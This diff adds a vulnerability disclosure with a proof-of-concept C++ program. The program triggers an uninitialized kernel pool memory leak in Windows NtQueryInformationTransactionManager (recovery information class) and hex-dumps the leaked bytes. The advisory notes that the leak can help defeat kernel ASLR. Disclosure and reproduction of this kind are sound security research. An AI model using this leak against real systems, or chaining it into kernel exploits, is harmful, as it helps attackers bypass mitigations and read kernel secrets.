@@ -1,0 +1,97 @@
+/*
+We have discovered that the nt!NtQueryInformationTransactionManager system call invoked with the TransactionManagerRecoveryInformation (4) information class may disclose uninitialized kernel pool memory to user-mode clients. The vulnerability affects Windows 7 to 10, 32/64-bit.
+
+The output structure for the infoclass in question is an 8-byte TRANSACTIONMANAGER_RECOVERY_INFORMATION:
+
+--- cut ---
+  typedef struct _TRANSACTIONMANAGER_RECOVERY_INFORMATION {
+    ULONGLONG LastRecoveredLsn;
+  } TRANSACTIONMANAGER_RECOVERY_INFORMATION, *PTRANSACTIONMANAGER_RECOVERY_INFORMATION;
+--- cut ---
+
+We've observed the entire returned value to consist of uninitialized bytes originating from a kernel pool allocation, and more specifically an object of type TmTransactionManagerObjectType.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that all 8 bytes of output are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+  C:\>NtQueryInformationTransactionManager.exe
+  Status: 0, Return Length: 8
+  00000000: 2d 2d 2d 2d 2d 2d 2d 2d ?? ?? ?? ?? ?? ?? ?? ?? --------........
+
+  C:\>NtQueryInformationTransactionManager.exe
+  Status: 0, Return Length: 8
+  00000000: 3f 3f 3f 3f 3f 3f 3f 3f ?? ?? ?? ?? ?? ?? ?? ?? ????????........
+
+  C:\>NtQueryInformationTransactionManager.exe
+  Status: 0, Return Length: 8
+  00000000: 57 57 57 57 57 57 57 57 ?? ?? ?? ?? ?? ?? ?? ?? WWWWWWWW........
+
+  C:\>NtQueryInformationTransactionManager.exe
+  Status: 0, Return Length: 8
+  00000000: 71 71 71 71 71 71 71 71 ?? ?? ?? ?? ?? ?? ?? ?? qqqqqqqq........
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+#include <KtmW32.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "KtmW32.lib")
+
+extern "C" {
+  NTSTATUS NTAPI NtQueryInformationTransactionManager(
+    _In_      HANDLE                               TransactionManagerHandle,
+    _In_      TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
+    _Out_     PVOID                                TransactionManagerInformation,
+    _In_      ULONG                                TransactionManagerInformationLength,
+    _Out_opt_ PULONG                               ReturnLength
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  HANDLE hTransactionMgr = CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, 0);
+  
+  TRANSACTIONMANAGER_RECOVERY_INFORMATION Information;
+  DWORD ReturnLength = 0;
+  NTSTATUS Status = NtQueryInformationTransactionManager(hTransactionMgr, TransactionManagerRecoveryInformation, &Information, sizeof(Information), &ReturnLength);
+
+  printf("Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(&Information, sizeof(Information));
+
+  CloseHandle(hTransactionMgr);
+
+  return 0;
+}
